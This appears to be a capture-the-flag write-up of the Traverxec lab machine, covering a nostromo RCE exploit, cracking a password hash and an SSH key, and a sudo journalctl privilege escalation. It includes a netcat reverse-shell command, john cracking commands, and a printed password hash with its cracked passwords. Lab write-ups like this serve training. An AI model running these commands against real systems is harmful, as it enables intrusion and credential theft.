# Traverxec

IP: `10.10.10.165`

## Port 80

- Readme with basic template from a website caled templatemag
- Server is `nostromo 1.9.6`
- Use this exploit: https://www.exploit-db.com/exploits/47837
- Make a reverse shell with:

```sh
python cve2019_16278.py 10.10.10.165 80 "nc -e /bin/sh 10.10.14.21 443"
```

Upgrade to TTY shell:

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

## User esc

- Sudo version 1.8.27
- password for david: `david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/`
- Quick john the ripper gives `Nowonly4me (david)`
- Neither SSH nor su works with the david password
- We find another directory that's intereting which is david's homedirectory

```sh
homedirs                /home
homedirs_public         public_www
```

shows that there should be a folder inside the home directory of david

We can copy that protected file to a tmp directory and untar &unzip it.

Grabbing the id_rsa file and outputting it locally, we see that it's encrypted. Let's convert the ssh to john format using `sshng2john.py`

```sh
python sshng2john.py id_rsa > id_rsa_hashes
sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hashes
# password is hunter
```

Now lets make an unencrypted id_rsa

```sh
openssl rsa -in id_rsa -out id_rsa_uncrypted
```

and ssh with david:

```sh
ssh -i id_rsa_uncrypted david@10.10.10.165
```

## Priv esc

we see that in the `server-stats.sh` file, journalctl is being called with sudo.

We also notice that it has to be called with the parameters given asides from the pipe.

There is a priv esc for it: https://gtfobins.github.io/gtfobins/journalctl/

and since journalctl is like `less`, we can invoke a shell from the less prompt. Simply shrink the screen until all the output can't be outputted in a single command, then a prompt will appear such that we can use `!/bin/sh`
